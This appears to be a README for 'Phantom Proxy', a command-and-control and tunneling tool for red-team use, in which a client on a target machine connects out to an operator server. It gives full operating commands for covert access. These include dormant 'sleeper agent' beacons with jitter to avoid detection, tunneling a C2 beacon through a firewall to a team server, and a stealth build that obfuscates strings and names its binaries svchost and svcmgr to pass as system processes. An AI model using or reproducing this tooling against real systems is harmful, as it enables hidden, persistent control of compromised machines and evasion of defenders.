# Phantom Proxy

Multi-protocol tunneling & proxy tool with swappable transports. Server runs on the operator machine, client runs on the target and connects out.

## Build

```
make build          # -> build/phantom-server, build/phantom-client
make release        # cross-compile for linux/darwin/windows (amd64+arm64)
make stealth        # obfuscated build via garble (requires: go install mvdan.cc/garble@latest)
```

## Quick Start (TCP)

Server (operator):

```
./phantom-server -listen :4444 -secret mysecret -socks5 127.0.0.1:1080
```

Client (target):

```
./phantom-client -server <server-ip>:4444 -secret mysecret
```

Use the tunnel:

```
curl --socks5 127.0.0.1:1080 http://example.com
```

## Transports

All transports auto-generate ephemeral keys/certs if none are provided. The client never needs key files - just the shared secret.

### TLS

```
./phantom-server -listen :4444 -secret s -transport tls
./phantom-client -server host:4444 -secret s -transport tls
```

To use your own certs instead of auto-generated ones:

```
make certs
./phantom-server -listen :4444 -secret s -transport tls -cert certs/server.crt -certkey certs/server.key
./phantom-client -server host:4444 -secret s -transport tls -tls-ca certs/server.crt
```

### SSH

```
./phantom-server -listen :4444 -secret s -transport ssh
./phantom-client -server host:4444 -secret s -transport ssh
```

To use your own keys: add `-key keys/host_key` on the server, `-key keys/client_key` on the client.

### HTTP (WebSocket)

```
./phantom-server -listen :8080 -secret s -transport http
./phantom-client -server host:8080 -secret s -transport http
```

Options: `-http-path /custom`, `-http-host example.com`, `-http-ua "Mozilla/5.0"`.

HTTPS: add `-cert` and `-certkey` on the server (auto-generated TLS certs also work with `-transport http` if provided).

## Port Forwarding

Local forward (server listens, client dials target):

```
./phantom-server ... -local-forward 127.0.0.1:3306:dbhost:3306
```

Remote forward (client listens, routes through server):

```
./phantom-client ... -remote-forward 127.0.0.1:8080:internal:80
```

Both flags are repeatable.

### Use Case: Tunneling a Beacon Through a Restricted Firewall

If the target network blocks HTTPS but allows SSH, you can route a beacon's HTTPS traffic through the tunnel using a remote port forward:

```
[TARGET MACHINE]                              [OPERATOR MACHINE]

Beacon ──HTTPS──► 127.0.0.1:8443             phantom-server ──TCP──► teamserver:443
                      │                            ▲
                phantom-client ════════════════════╝
                  (SSH transport, bypasses firewall)
```

Server (operator):

```
./phantom-server -listen :2222 -transport ssh -secret mysecret
```

Client (target):

```
./phantom-client -server operator:2222 -transport ssh -secret mysecret \
    -remote-forward 127.0.0.1:8443:teamserver.c2.com:443
```

Configure the beacon to callback to `https://127.0.0.1:8443`. The proxy tunnels the raw TCP bytes over SSH to the server, which dials the team server. The beacon's TLS handshake happens end-to-end — the proxy never decrypts the traffic.

## Interactive C&C Mode

Interactive mode turns the server into a multi-client command & control platform. Dormant clients **fully disconnect between check-ins** — there is no persistent connection when dormant, making the traffic pattern much harder to detect.

### Setup

Server (operator):

```
./phantom-server -listen :4444 -secret mysecret -interactive -sleep-interval 5m -sleep-jitter 30
```

Client (target — deployed as a sleeper agent):

```
./phantom-client -server operator:4444 -secret mysecret -dormant
```

The client authenticates, receives any pending commands, disconnects, sleeps for `interval ± jitter`, then reconnects. When woken via `use <id>`, the client stays connected and enters active mode.

### Shell Commands

The interactive shell features readline support with arrow-key line editing, command history (up/down), and tab completion for commands and client IDs.

Once clients check in, the operator interacts via the shell. Commands sent to offline clients are queued and delivered at the next check-in:

```
phantom> list
ID      HOSTNAME       OS       ARCH    STATE    ONLINE   REMOTE              CONNECTED    LAST_SEEN
a3f1    web-prod-1     linux    amd64   dormant  offline  203.0.113.5:4921    2h ago       2m ago
b7c2    dev-box        linux    arm64   dormant  online   198.51.100.3:3318   45m ago      1s ago

phantom> use a3f1
client a3f1 is offline — WAKE queued for next check-in

phantom> use b7c2
activated client b7c2 (dev-box) — SOCKS5 traffic now routes through this client

phantom [b7c2]> status
Clients:     2 total, 1 online, 1 offline, 1 active
Active:      b7c2
SOCKS5:      127.0.0.1:1080
Uptime:      2h15m ago

phantom [b7c2]> interval a3f1 10m 20
client a3f1 is offline — interval update queued for next check-in

[notification] client a3f1 (web-prod-1) checked in and was woken
phantom [b7c2]> sleep b7c2
client b7c2 is now dormant

phantom> kick a3f1
kicked client a3f1

phantom> exit
sent DISCONNECT to 1 client(s), shutting down
```

Available commands:

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `list` / `ls` | List all clients (online and offline) |
| `use <id>` | Activate a client (sends directly or queues for next check-in) |
| `sleep <id>` | Return a client to dormant state |
| `sleep-all` | Sleep all active online clients |
| `kick <id>` | Disconnect (if online) and deregister a client |
| `info <id>` | Show detailed client info |
| `interval <id> <dur> [jitter%]` | Set beacon interval (e.g. `interval a3f1 5m 30`) |
| `status` | Show server status with online/offline/active counts |
| `exit` / `quit` | Disconnect all online clients and shutdown |

### How It Works

1. Client connects, authenticates with `Dormant: true` flag
2. Server uses `FindOrRegister` — matches by hostname for reconnections, preserving the client's ID and entry
3. Server sends any pending queued commands (wake, sleep, interval changes) and waits for acks
4. If no wake is pending: server sends `CmdCheckinDone`, client disconnects and sleeps
5. If wake was pending and acked: client stays connected, starts `HandleStreams` for SOCKS5 data
6. When operator sends `sleep <id>`: if online, sent directly; if offline, queued for next check-in
7. On sleep, client disconnects and returns to the check-in loop
8. Only one client is active at a time; `use` automatically sleeps the previous active client

### Backward Compatibility

- Without `-interactive`, the server works exactly as before (single-client, automatic session)
- Without `-dormant`, the client works exactly as before (starts stream handling immediately)
- A `-dormant` client connecting to a non-interactive server will timeout after 30s and retry (safe fallback)

## Flags

### Server

| Flag               | Default          | Description                        |
| ------------------ | ---------------- | ---------------------------------- |
| `-listen`          | `:4444`          | Listen address                     |
| `-transport`       | `tcp`            | Transport: tcp, tls, ssh, http     |
| `-secret`          | (required)       | Shared secret                      |
| `-socks5`          | `127.0.0.1:1080` | SOCKS5 listen address             |
| `-interactive`     | `false`          | Enable interactive C&C shell       |
| `-sleep-interval`  | `30s`            | Default beacon interval for clients|
| `-sleep-jitter`    | `0`              | Default jitter percentage (0-100)  |
| `-local-forward`   |                  | Local port forward (repeatable)    |
| `-cert`            | (auto-generated) | TLS certificate                    |
| `-certkey`         | (auto-generated) | TLS private key                    |
| `-tls-ca`          |                  | CA cert for mTLS client auth       |
| `-key`             | (auto-generated) | SSH host key                       |
| `-http-path`       | `/ws`            | WebSocket path                     |
| `-log-level`       | `info`           | debug, info, warn, error           |

### Client

| Flag               | Default          | Description                      |
| ------------------ | ---------------- | -------------------------------- |
| `-server`          | `localhost:4444` | Server address                   |
| `-transport`       | `tcp`            | Transport: tcp, tls, ssh, http   |
| `-secret`          | (required)       | Shared secret                    |
| `-reconnect`       | `true`           | Auto-reconnect with backoff      |
| `-dormant`         | `false`          | Dormant mode (disconnect between check-ins) |
| `-remote-forward`  |                  | Remote port forward (repeatable) |
| `-cert`            |                  | TLS client cert (mTLS, optional) |
| `-certkey`         |                  | TLS client key (mTLS, optional)  |
| `-tls-ca`          |                  | CA cert for server verification  |
| `-key`             | (auto-generated) | SSH client key                   |
| `-http-path`       | `/ws`            | WebSocket path                   |
| `-http-host`       |                  | Custom Host header               |
| `-http-ua`         |                  | Custom User-Agent                |
| `-log-level`       | `info`           | debug, info, warn, error         |

## Stealth Build

`make stealth` produces obfuscated binaries (`build/svchost`, `build/svcmgr`) for red team use:

- All identifiable strings (`phantom-proxy`, `phantom-tunnel`, etc.) are replaced via `-ldflags -X` with innocuous values (`localhost`, `direct-tcpip`, `admin`, `/health`)
- `garble -literals -tiny` obfuscates all remaining string literals and symbols
- `-trimpath -buildvcs=false` strips source paths and build metadata

The stealth values are configured in the `Makefile` and injected into `internal/buildcfg`. Normal `make build` is unaffected — all defaults remain the same.

Verify:

```
strings build/svchost | grep phantom   # should return nothing
```

## Testing

```
go test ./...                    # all unit + integration tests
go test -race ./...              # with race detector
go test -run TestIntegration     # integration tests only
go test ./internal/crypto/...    # crypto unit tests only
go test -short ./...             # skip integration tests
```

Integration tests build real server/client binaries, start them as subprocesses on ephemeral ports, and route traffic through SOCKS5 to a local `httptest.Server`. No external network access required.
